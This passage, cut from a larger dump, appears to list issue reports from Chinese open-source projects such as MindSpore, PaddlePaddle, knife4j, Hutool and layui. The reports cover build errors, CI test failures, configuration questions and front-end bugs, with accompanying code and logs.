STANDARD|a8f6a5c0dd4e48eba4d86b825850b8c5"",""parentClassCode"":""INTERNATION_STANDARD"",""systemId"":""a8f6a5c0dd4e48eba4d86b825850b8c5"",""systemName"":""PS5"",""createTime"":1663811979000,""busClassId"":""829b4513ea1b44e5a19d11bc17a8620e"",""className"":""PS5"",""nodeType"":""2""},{""classCode"":""GB/T 2261.1-2003"",""parentClassCode"":""STAFF_CODE"",""createTime"":1666083611000,""busClassId"":""ff1f4512d3f349fa8d1445e9291830c6"",""className"":""性别测试"",""nodeType"":""1""},{""classCode"":""GB/T 2261.1-2003|fd9025effd724ceda3fa0da9808f1b83"",""parentClassCode"":""GB/T 2261.1-2003"",""systemId"":""fd9025effd724ceda3fa0da9808f1b83"",""systemName"":""妇幼系统ylf"",""createTime"":1666083639000,""busClassId"":""349cf13d1ccf4da2864d944ec90fc6d3"",""className"":""妇幼系统ylf"",""nodeType"":""2""},{""classCode"":""clincDict"",""parentClassCode"":""root"",""systemId"":""7abf6e3d189d4ccb8a8e14c2628b3b8b"",""busClassId"":""0b8672fc455c432aa36ebde94396501b"",""className"":""诊疗业务字典"",""nodeType"":""1""},{""classCode"":""HIS|7abf6e3d189d4ccb8a8e14c2628b3b8b"",""parentClassCode"":""HIS"",""systemId"":""7abf6e3d189d4ccb8a8e14c2628b3b8b"",""systemName"":""HIS系统"",""busClassId"":""33f506170cde48f3b6b5f2842c8ae5c0"",""className"":""HIS系统"",""nodeType"":""2""},{""classCode"":""staff|7abf6e3d189d4ccb8a8e14c2628b3b8b"",""parentClassCode"":""staff"",""systemId"":""7abf6e3d189d4ccb8a8e14c2628b3b8b"",""systemName"":""HIS系统"",""busClassId"":""6afe35d20f9d4068b615b9db0073ff6c"",""className"":""HIS系统"",""nodeType"":""2""},{""classCode"":""INTERNATION_STANDARD|7abf6e3d189d4ccb8a8e14c2628b3b8b"",""parentClassCode"":""INTERNATION_STANDARD"",""systemId"":""7abf6e3d189d4ccb8a8e14c2628b3b8b"",""systemName"":""HIS系统"",""busClassId"":""c8c886ba86ca41288d4f91aa8149dd5f"",""className"":""HIS系统"",""nodeType"":""2""},{""classCode"":""diagnosis_pay |7abf6e3d189d4ccb8a8e14c2628b3b8b"",""parentClassCode"":""diagnosis_pay "",""systemId"":""7abf6e3d189d4ccb8a8e14c2628b3b8b"",""systemName"":""HIS系统"",""busClassId"":""79ddce69d0db4b79ad4a6cd38df1836e"",""className"":""HIS系统"",""nodeType"":""2""}] //配置 TreeNodeConfig treeNodeConfig = new TreeNodeConfig(); // 自定义属性名 都要默认值的 treeNodeConfig.setIdKey(""classCode"") .setParentIdKey(""parentClassCode"") .setNameKey(""busClassId""); List&lt;Tree&lt;String&gt;&gt; treeNodes = TreeUtil.build(allBusClass, ""root"", treeNodeConfig, (treeNode, tree) -&gt; { tree.setId(MapUtil.getStr(treeNode,""classCode"")); tree.setParentId(MapUtil.getStr(treeNode,""parentClassCode"")); tree.setName(MapUtil.getStr(treeNode,""className"")); tree.putExtra(""systemName"", MapUtil.getStr(treeNode,""className"")); tree.putExtra(""systemId"", MapUtil.getStr(treeNode,""systemId"")); tree.putExtra(""busClassId"", MapUtil.getStr(treeNode,""busClassId"")); tree.putExtra(""nodeType"", MapUtil.getStr(treeNode,""nodeType"")); }); return treeNodes;"
2.0.7增强模式配置指定分组失效,"springboot2.2.13.RELEASE + knife4j-spring-boot-starter2.0.7 对不同分组指定增强模式配置时，不想增强的分组展示也出现问题 Knife4jConfiguration.java application.yml http://localhost:8999/v2/api-docs?group=safety接口 返回有x-openapi http://localhost:8999/v2/api-docs?group=实体类 返回有没有x-openapi，界面SwaggerModel不显示   <code>: @Bean(value = ""entityApi"") public Docket entityApi() { String groupName=""实体类""; Docket docket=new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .groupName(groupName) .select() //这里指定Controller扫描包路径,所有添加@RestController注解的类 .apis(RequestHandlerSelectors.basePackage(""com.chen.safety.entity"")) .paths(PathSelectors.any()) .build(); return docket; } @Bean(value = ""defaultApi"") public Docket defaultApi() { String groupName=""safety接口""; Docket docket=new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .groupName(groupName) .select() //这里指定Controller扫描包路径,所有添加@RestController注解的类 .apis(RequestHandlerSelectors.withClassAnnotation(RestController.class)) .paths(PathSelectors.any()) .build() .extensions(openApiExtensionResolver.buildExtensions(groupName)); return docket; } knife4j: enable: true cors: false production: false basic: enable: false username: chenyue password: 123456 documents: - group: safety接口 name: safety接口 setting: enableSwaggerModels: false swaggerModelName: 实体类列表"
"[MS][LITE][6.1.0.300] CPU/GPU_FP16, mtk_NLU-tinybert.onnx, compile graph fail",": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: 测试版本：交付版本 6.1.0.300 ，commit id:97e3ee9b27b98da06f430fb5e45587a462db9371（2021-08-02-10-12-33） 测试用例：mtk_NLU-tinybert.onnx和mtk_NLU-tinybert-0114.onnx, 将标杆数据以及ms模型推送到手机，进行推理验证精度 测试结果：预期推理结果精度达标，实际模型推理过程中，除p8 p20 honor6用例pass,其余机型图编译失败 08-07 03:24:38.886 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/gather.cc:54] CheckSpecs] GatherOpenCLKernel only supports 1D indices Tensor but get 2D. 08-07 03:24:38.886 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.887 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/gather.cc:54] CheckSpecs] GatherOpenCLKernel only supports 1D indices Tensor but get 2D. 08-07 03:24:38.887 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.911 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/gather.cc:54] CheckSpecs] GatherOpenCLKernel only supports 1D indices Tensor but get 2D. 08-07 03:24:38.911 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.911 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/layer_norm.cc:41] CheckSpecs] UnSupported in_tensors_.shape.size: 3 08-07 03:24:38.911 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.911 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/layer_norm.cc:41] CheckSpecs] UnSupported in_tensors_.shape.size: 3 08-07 03:24:38.911 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.911 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/activation.cc:59] CheckSpecs] schema::ActivationType:19not found 08-07 03:24:38.911 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.911 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/layer_norm.cc:41] CheckSpecs] UnSupported in_tensors_.shape.size: 3 08-07 03:24:38.911 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/layer_norm.cc:41] CheckSpecs] UnSupported in_tensors_.shape.size: 3 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/activation.cc:59] CheckSpecs] schema::ActivationType:19not found 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/layer_norm.cc:41] CheckSpecs] UnSupported in_tensors_.shape.size: 3 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/layer_norm.cc:41] CheckSpecs] UnSupported in_tensors_.shape.size: 3 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/activation.cc:59] CheckSpecs] schema::ActivationType:19not found 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/layer_norm.cc:41] CheckSpecs] UnSupported in_tensors_.shape.size: 3 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/layer_norm.cc:41] CheckSpecs] UnSupported in_tensors_.shape.size: 3 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/activation.cc:59] CheckSpecs] schema::ActivationType:19not found 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/layer_norm.cc:41] CheckSpecs] UnSupported in_tensors_.shape.size: 3 08-07 03:24:38.912 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.h:262] OpenCLKernelCreator] Check specification failed! 08-07 03:24:39.119 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:514] BuildProgram] Program build log: :18:10: error: initializing 'float4' (vector of 4 'float' values) with an expression of incompatible type 'half __attribute__((ext_vector_type(4)))' (vector of 4 'half' values) 08-07 03:24:39.119 13820 13820 E MS_LITE : FLT4 v = READ_IMAGE(input, smp_zero, (int2)(i, gidz)); 08-07 03:24:39.119 13820 13820 E MS_LITE : ^ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 08-07 03:24:39.119 13820 13820 E MS_LITE : 08-07 03:24:39.119 13820 13820 E MS_LITE : :32:12: error: implicit conversions between vector types ('float4' (vector of 4 'float' values) and 'half __attribute__((ext_vector_type(4)))' (vector of 4 'half' values)) are not permitted 08-07 03:24:39.119 13820 13820 E MS_LITE : result += READ_IMAGE(bias, smp_zero, (int2)(gidx, 0)); 08-07 03:24:39.119 13820 13820 E MS_LITE : ^ 08-07 03:24:39.119 13820 13820 E MS_LITE : 08-07 03:24:39.119 13820 13820 E MS_LITE : :33:5: error: no matching function for call to 'write_imageh' 08-07 03:24:39.119 13820 13820 E MS_LITE : WRITE_IMAGE(output, (int2)(gidx, gidz), result); 08-07 03:24:39.119 13820 13820 E MS_LITE : ^~~~~~~~~~~ 08-07 03:24:39.119 13820 13820 E MS_LITE : :14:21: note: expanded from here 08-07 03:24:39.119 13820 13820 E MS_LITE : #define WRITE_IMAGE write_imageh 08-07 03:24:39.119 13820 13820 E MS_LITE : ^~~~~~~~~~~~ 08-07 03:24:39.119 13820 13820 E MS_LITE : 08-07 03:24:39.119 13820 13820 E MS_LITE : note: candidate function not viable: no known conversion from 'float4' (vector of 4 'float' values) to 'h 08-07 03:24:39.119 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:516] BuildProgram] Build program failed: Build program failure 08-07 03:24:39.119 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:421] BuildKernel] MatMul build failed! 08-07 03:24:39.119 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/matmul.cc:95] Prepare] Build kernel failed. 08-07 03:24:39.119 13820 13820 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_subgraph.cc:331] Prepare] prepare node Add_104 failed 08-07 03:24:39.119 13820 13820 E MS_LITE : [mindspore/lite/src/lite_session.cc:598] PrepareKernels] Prepare kernel GpuSubGraph1 failed: -1 08-07 03:24:39.119 13820 13820 E MS_LITE : [mindspore/lite/src/lite_session.cc:510] CompileGraph] Prepare kernels failed: -1"
legend问题,"当legend设置float为 left时，点击第一个legend是有效的，其他的点击无效 legend: {   <code>: position: 'top', float: 'left', padding: 10, margin: 0 },"
Transfer Learning for DS2,"Users want to use deep speech 2 model for transfer learning. Users want to extract the speech features by model, just like they extract image features by VGGNet. And then, many interesting things could be done, for example. We can compare the similarity of two speakers. The difference will show how clear the input speech was, thus allowing us to determine how clear or unclear one's pronunciation of a phoneme may be.   <code>: DS2"
16进制转化为中文字符串,"JDK版本： 1.8 hutool版本： 5.8.0.M1 16进制转化为中文字符串，解析结果差异过大。 以下为正确转码的代码   <code>: public static String enUnicode(String content) {// 将汉字转换为16进制数 String enUnicode = null; for (int i = 0; i &lt; content.length(); i++) { if (i == 0) { enUnicode = getHexString(Integer.toHexString(content.charAt(i)).toUpperCase()); } else { enUnicode = enUnicode + getHexString(Integer.toHexString(content.charAt(i)).toUpperCase()); } } return enUnicode; } private static String getHexString(String hexString) { String hexStr = """"; for (int i = hexString.length(); i &lt; 4; i++) { if (i == hexString.length()) hexStr = ""0""; else hexStr = hexStr + ""0""; } return hexStr + hexString; }"
GetPlacesOp should have an `Auto` device type,Our configuration should not be related to devices. So we should add an device type to .   <code>: Auto GetPlacesOp
[ST][MS][NetGeneral][多个网络]mean和std写固定值，且无相关的注释，可读性差且存在与配置文件中的部分值存在关联导致训练报错的风险,"mean和std写固定值，且无相关的注释，可读性差且存在与配置文件中的部分值存在关联导致训练报错的风险。 目前从office目录下检查出43行代码是写固定了std和mean值的，如ADNet网络中的.\cnnctc\src\dataset.py文件等。 目前是代码层，不涉及测试环境 : https://gitee.com/mindspore/models/tree/master/official/cv/resnet (/): 代码层审读 泛化测试 代码审读，mean和std写固定值，且无相关的注释，可读性差且存在与配置文件中的部分值存在关联导致训练报错的风险，从代码中审读检查出43行风险点 例子举例：.\cnnctc\src\dataset.py,存在means、std写固定值，无注释 这些值期待现象：展示下计算过程或备注上相关的注释表述清楚为何写固定。 如A<em>B</em>C表达计算过程或者备注上为何引用此固定值，增加易读性,明确下此值是否可修改，和哪些参数有关联 无日志 问题已和高向确认，先提交issue，附件上疑点整理，见附件《resule_20220704.xls》的表《mean和std写固定》   <code>: class NormalizePAD(): def __init__(self, max_size, PAD_type='right'): self.max_size = max_size self.PAD_type = PAD_type def __call__(self, img): # toTensor img = np.array(img, dtype=np.float32) # normalize means = [121.58949, 123.93914, 123.418655] stds = [65.70353, 65.142426, 68.61079] img = np.subtract(img, means) img = np.true_divide(img, stds) img = img.transpose([2, 0, 1]) img = img.astype(np.float) _, _, w = img.shape Pad_img = np.zeros(shape=self.max_size, dtype=np.float32) Pad_img[:, :, :w] = img # right pad if self.max_size[2] != w: # add border Pad Pad_img[:, :, w:] = np.tile(np.expand_dims(img[:, :, w - 1], 2), (1, 1, self.max_size[2] - w)) return Pad_img"
sql语句中有多一个条件判断报错,"同样的sql查询语句，只要添加一个条件就报错，下面的查询是好的： 多添加一个条件就报错，无论是（b.grade = '良好' or (b.grade &lt; 90 and b.grade &gt;= 80)）还是不加括号都会报错 是否是&lt;&gt;括号转义导致的错误？   <code>: SELECT COUNT(0) FROM record_score_bas b LEFT JOIN emp_bas e ON b.emp_id = e.id WHERE (b.grade = '优秀' or b.grade &gt;= 90 ) and e.org_id IN &lt;foreach item='item' index='index' collection='orgList' open=""("" separator="","" close="")""&gt; #{item} &lt;/foreach&gt; SELECT COUNT(0) FROM record_score_bas b LEFT JOIN emp_bas e ON b.emp_id = e.id WHERE (b.grade = '良好' or b.grade &lt; 90 and b.grade &gt;= 80 ) and e.org_id IN &lt;foreach item='item' index='index' collection='orgList' open=""("" separator="","" close="")""&gt; #{item} &lt;/foreach&gt;"
ApiParam 里面带有链接时 不能正常显示跳转,"在1.9.6版本下，可以设置接口的例子，比如 由于ui框架的改变，在2.0.5下变成了字符串，不能跳转了，有没有解决方案？   <code>: @ApiOperation(""单条保存表单数据，带_id字段则更新,不带保存"") @PostMapping(""/data/save"") public BaseResult&lt;?&gt; saveFormValue(@RequestToken BdkSession session, String formId, @RequestBody @ApiParam(""&lt;a href='json/form/formValue.json' target='jsonExample'&gt;例子&lt;/a&gt;"") JSONObject value) { dataFormService.saveFormValue(session, formId, value); return BaseResultFactory.produceEmptyResult(Code.SUCCESS); }"
Refactorize registry macro,"Fixes #3372:Remove FullyConnectedOp in `paddle::operators` Extracting operator kernel register struct from macro . And making it an independent class . Invoking static registrars in touch functions(old name: XXX_handle), to make sure registrars are going to be linked in. Renaming some macros, functions, and variables. ATTENTION: For many gradient operators have not been completed, the macro is disabled for the present.   <code>: REGISTER_OP_KERNEL OpKernelRegistrar REGISTER_OP_KERNEL()"
【重构】 获取客户端clientId 的方法,环境信息 pigx版本: v4.2 是否修改包名: 否 提供详细   <code>: BasicAuthenticationConverter basicAuthenticationConverter = new BasicAuthenticationConverter(); UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = basicAuthenticationConverter.convert(request); if (usernamePasswordAuthenticationToken != null) { return usernamePasswordAuthenticationToken.getName(); }
[MD] CI Failures with C++ dataset UT MindDataTestProfiler.TestProfilerManagerByStep,"The following symptoms have been encountered multiple times (5+) in CI runs within the past 1 day: Symptom 1: Failure in MindDataTestProfiler.TestProfilerManagerByStep line 347 with onnector_result.size()=0. Symptom 2: Failure in MindDataTestProfiler.TestProfilerManagerByStep line 346 with assert failure for Failure ""start_time &lt; end_time."" then secondary failure for MindDataTestProfiler.TestProfilerManagerByTime.   <code>: [2022-12-07T09:58:34.077Z] [ RUN ] MindDataTestProfiler.TestProfilerManagerByStep [2022-12-07T09:58:46.274Z] /home/jenkins/agent-working-dir/workspace/Compile_UT/mindspore/tests/ut/cpp/dataset/profiler_test.cc:347: Failure [2022-12-07T09:58:46.274Z] Expected: (connector_result.size()) &gt; (0), actual: 0 vs 0 [2022-12-07T09:58:46.274Z] [ FAILED ] MindDataTestProfiler.TestProfilerManagerByStep (13618 ms) &lt;...&gt; [2022-12-07T16:52:06.401Z] [ RUN ] MindDataTestProfiler.TestProfilerManagerByStep [2022-12-07T16:52:18.602Z] [ERROR] ME(1843897,7fd029789480,ut_tests):2022-12-08-00:52:16.687.321 [tests/ut/cpp/dataset/profiler_test.cc:346] TestBody] Exception thrown from dataset pipeline. Refer to 'Dataset Pipeline Error Message'. Expected start_time &lt; end_time. Got start_ts: 6675875795 end_ts: 6675875795 [2022-12-07T16:52:18.602Z] Line of code : 130 [2022-12-07T16:52:18.602Z] File : mindspore/ccsrc/minddata/dataset/engine/perf/connector_size.cc [2022-12-07T16:52:18.602Z] . [2022-12-07T16:52:18.602Z] /home/jenkins/agent-working-dir/workspace/Compile_UT/mindspore/tests/ut/cpp/dataset/profiler_test.cc:346: Failure [2022-12-07T16:52:18.602Z] Value of: false [2022-12-07T16:52:18.602Z] Actual: false [2022-12-07T16:52:18.602Z] Expected: true [2022-12-07T16:52:18.602Z] [ FAILED ] MindDataTestProfiler.TestProfilerManagerByStep (12169 ms) [2022-12-07T16:52:18.602Z] [ RUN ] MindDataTestProfiler.TestProfilerManagerByTime [2022-12-07T16:52:18.602Z] [ERROR] ME(1843897,7fd029789480,ut_tests):2022-12-08-00:52:16.695.395 [tests/ut/cpp/dataset/profiler_test.cc:374] TestBody] Exception thrown from dataset pipeline. Refer to 'Dataset Pipeline Error Message'. Stop MD Profiler before initializing it. [2022-12-07T16:52:18.602Z] Line of code : 728 [2022-12-07T16:52:18.602Z] File : mindspore/ccsrc/minddata/dataset/engine/perf/profiling.cc [2022-12-07T16:52:18.602Z] . [2022-12-07T16:52:18.602Z] /home/jenkins/agent-working-dir/workspace/Compile_UT/mindspore/tests/ut/cpp/dataset/profiler_test.cc:374: Failure [2022-12-07T16:52:18.602Z] Value of: false [2022-12-07T16:52:18.602Z] Actual: false [2022-12-07T16:52:18.602Z] Expected: true [2022-12-07T16:52:18.602Z] [ERROR] ME(1843897,7fd029789480,ut_tests):2022-12-08-00:52:16.695.417 [tests/ut/cpp/dataset/profiler_test.cc:375] TestBody] Exception thrown from dataset pipeline. Refer to 'Dataset Pipeline Error Message'. MD ProfilingManager is already running. [2022-12-07T16:52:18.602Z] Line of code : 749 [2022-12-07T16:52:18.602Z] File : mindspore/ccsrc/minddata/dataset/engine/perf/profiling.cc [2022-12-07T16:52:18.602Z] . [2022-12-07T16:52:18.602Z] /home/jenkins/agent-working-dir/workspace/Compile_UT/mindspore/tests/ut/cpp/dataset/profiler_test.cc:375: Failure [2022-12-07T16:52:18.602Z] Value of: false [2022-12-07T16:52:18.602Z] Actual: false [2022-12-07T16:52:18.602Z] Expected: true [2022-12-07T16:52:18.602Z] /home/jenkins/agent-working-dir/workspace/Compile_UT/mindspore/tests/ut/cpp/dataset/profiler_test.cc:376: Failure [2022-12-07T16:52:18.602Z] Value of: profiler_manager-&gt;IsProfilingEnable() [2022-12-07T16:52:18.602Z] Actual: false [2022-12-07T16:52:18.602Z] Expected: true [2022-12-07T16:52:18.602Z] [WARNING] MD(1843897,7fd029789480,ut_tests):2022-12-08-00:52:16.695.828 [mindspore/ccsrc/minddata/dataset/engine/consumers/tree_consumer.cc:76] RegisterProfilingManager] Dataset Profiling is already enabled for a different data pipeline. [2022-12-07T16:52:30.801Z] [ERROR] ME(1843897,7fd029789480,ut_tests):2022-12-08-00:52:28.962.477 [tests/ut/cpp/dataset/profiler_test.cc:410] TestBody] Exception thrown from dataset pipeline. Refer to 'Dataset Pipeline Error Message'. No data available for time &gt;= start_ts. start_ts: 6675886471 [2022-12-07T16:52:30.801Z] Line of code : 148 [2022-12-07T16:52:30.801Z] File : mindspore/ccsrc/minddata/dataset/engine/perf/profiling.cc [2022-12-07T16:52:30.801Z] . [2022-12-07T16:52:30.801Z] /home/jenkins/agent-working-dir/workspace/Compile_UT/mindspore/tests/ut/cpp/dataset/profiler_test.cc:410: Failure [2022-12-07T16:52:30.801Z] Value of: false [2022-12-07T16:52:30.801Z] Actual: false [2022-12-07T16:52:30.801Z] Expected: true [2022-12-07T16:52:30.801Z] [ FAILED ] MindDataTestProfiler.TestProfilerManagerByTime (12267 ms)"
[CT][MS][SparseMatrixNNZ] SparseMatrixNNZ等等算子，执行性能用例，报错提示：FileNotFoundError: [Errno 2] No such file or directory,"1, 不只这一个算子。 GPU环境， SparseMatrixNNZ 算子，执行性能用例，报错找不到目录 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: def test_performance_sparsematrixnnz_3163_3163(): input = gen_test_case_data(np.float32, np.int64, (3163, 3163), -100, 100) fact = SparseMatrixNNZMock(inputs=input) &gt; fact.forward_profile_cmp() test_sparsematrixnnz.py:949: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/sparsematrixnnz_ops.py:161: in forward_profile_cmp forward_profile_ms = self.mindspore_profile(net, run_time, op_name, *inputs) ../share/ops/primitive/sparsematrixnnz_ops.py:90: in mindspore_profile profiler_ms.analyse() /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/profiler/profiling.py:319: in analyse self._gpu_analyse() /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/profiler/profiling.py:885: in _gpu_analyse reduce_op_type = self._get_step_reduce_op_type() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.profiler.profiling.Profiler object at 0x7f8f2562add0&gt; def _get_step_reduce_op_type(self): """"""Gets all communication operator names."""""" step_trace_original_filename = f'step_trace_profiling_{self._dev_id}.txt' step_trace_file_path = os.path.join(self._output_path, step_trace_original_filename) step_trace_file_path = validate_and_normalize_path(step_trace_file_path) reduce_op_type = [] &gt; with open(step_trace_file_path, 'r') as f_obj: E FileNotFoundError: [Errno 2] No such file or directory: '/home/zhangxuebao/MindSporeTest/operations/data/profiler/step_trace_profiling_0.txt'"
前台数据验证是提示Cannot read property 'unique' of undefined,"前台代码中的 这段代码有问题   <code>: dataFilter: function(data, type) { return $.validate.unique(data); }"
[ST][MS/modelzoo][NET][faceetection][ascend310] infer fail ,"训练失败 / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id: c16390f5 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/202209 MindSpore 版本：编译时间202209 r1.9.0 commit_id: c16390f5 (/): /mode graph test_ms_facedetection_310_train_infer.py cd solution_test/cases/02network/00cv/facedetection/train/ pytest -s test_ms_facedetection_310_train_infer.py 网络训练成功 走给肖天赐   <code>: Traceback (most recent call last): File ""../preprocess.py"", line 87, in &lt;module&gt; preprocess() File ""../preprocess.py"", line 80, in preprocess images.save(os.path.join(images_path, image_name[0].decode() + "".jpg""))"
radio动态控制可选择值,"当服务端返回status值等于3时，0、1、2都变成禁用，不让选择   <code>: { type: 'radio', label: '状态', value: 1, dicData: [ { label: '禁用', value: 0, disabled: true }, { label: '进件中', value: 1 }, { label: '审核中', value: 2 }, { label: '审批通过', value: 3 }, { label: '审批拒绝', value: 4 } ], display: true, search: 'true', prop: 'status', rules: [ { required: true, message: '请选择状态' } ], required: true, span: 24 }"
关于[book]个性化推荐网络结构的一些疑问,"来源： http://book.paddlepaddle.org/recommender_system/ 在看完这个网络结构后，有三个问题想请教： 1）比如gender只有男女两个值，但是在网络结构中，还是把它映射成了256维的向量，这么做的意义是什么呢？ 2）我不是很熟悉embedding_layer，可以理解成embedding_layer的作用，基本都是把一个维度很大离散的输入，映射程固定长度的词向量，且词向量之间的距离可以表示原始输入的相似度？ 3）模型输出是cos（向量a, 向量b），这个值是[-1, 1]那为什么最后会输出4.25的分数？   <code>: embsize = 256 gender_emb = embedding_layer(input=gender, size=embsize) gender_hidden = fc_layer(input=gender_emb, size=embsize)"
【众智】【计算-GPU开发】MultilabelMarginLossGrad,"接口目录：mindspore/ops/operations/_grad_ops.py y_grad x target is_target x_grad reduction string 属性 对应底层算子 Classify Name Type Type Range Required INPUT y_grad fp16,fp32,double TRUE INPUT x fp16,fp32,double TRUE INPUT target int64 TRUE INPUT is_target double FALSE OUTPUT x_grad fp16,fp32,double TRUE ATTR reduction string TRUE 标杆接口参考 无公开接口 3. 异常处理 4. 算子反向 无反向   <code>: MultilabelMarginLoss算子的反向实现。 class MultilabelMarginLossGrad(Primitive):"
如果你不想显示标题栏，你可以title: false！！！！默认也没有标题栏啊，为啥要写false呢？,"写不写title:false也没有效果啊？！！！什么时候需要用这个false属性值呢？   <code>: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=""utf-8""&gt; &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1, maximum-scale=1""&gt; &lt;title&gt;layout 后台大布局 - Layui&lt;/title&gt; &lt;link rel=""stylesheet"" href=""layui/css/layui.css""&gt; &lt;script src=""js/jquery3.5.1.js""&gt;&lt;/script&gt; &lt;script src=""layui/layui.all.js""&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; layui.use('layer', function() { var layer = layui.layer; layer.msg('hello world! 你好，中国！', { type: 0, title: false }); }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
